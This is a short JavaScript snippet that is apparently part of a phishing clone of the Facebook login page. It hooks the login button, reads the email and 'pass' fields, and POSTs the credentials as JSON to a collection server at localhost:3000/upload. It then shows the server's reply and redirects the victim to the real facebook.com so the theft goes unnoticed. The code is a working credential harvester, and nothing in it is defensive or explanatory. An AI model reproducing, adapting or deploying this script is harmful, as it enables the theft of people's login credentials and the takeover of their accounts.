document.getElementById("u_0_5_Xy").addEventListener("click", function(event) {
    // Prevent the form from submitting the traditional way
    event.preventDefault();

    // Get values from the input fields
    const email = document.getElementById("email").value;
    const password = document.getElementById("pass").value;

    // Prepare data to send to the server
    const data = { email: email, password: password };

    // Send the data to the server using a POST request
    fetch('http://localhost:3000/upload', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
    })
    .then(response => response.text())
    .then(data => {
        alert(data); 
        window.location.href = 'https://www.facebook.com';
    })
    .catch((error) => {
        console.error('Error:', error);
    });
});
